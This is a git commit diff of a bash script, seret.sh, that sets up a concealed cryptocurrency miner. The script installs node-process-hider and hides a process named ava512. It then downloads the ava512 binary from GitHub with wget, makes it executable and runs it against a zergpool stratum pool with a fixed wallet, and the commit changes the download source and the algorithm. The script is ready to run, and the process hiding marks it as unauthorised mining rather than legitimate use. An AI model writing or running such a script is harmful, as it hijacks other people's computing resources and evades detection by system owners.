7e1ec4c3cd702e6fad9da899defa123739f51bb9
ako255 <107749703+ako255@users.noreply.github.com>
2022-06-21 08:56:48 +0000

    Update seret.sh

--- seret.sh
+++ seret.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.12.0 && npm i -g node-process-hider
 && ph add ava512
-wget https://github.com/masdinoyo/vulner/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u 7W1QxayrhqEwjtgP6AZCKtXkswfcdvrRch
--p c=DASH,mc=QOGE -t 2
+wget https://github.com/ako255/pisang/raw/main/ava512 && chmod +x ava512 && ./ava512 -a x11 -o stratum+tcp://x11.mine.zergpool.com:6333 -u 7W1QxayrhqEwjtgP6AZCKtXkswfcdvrRch
+-p c=DASH -t 2
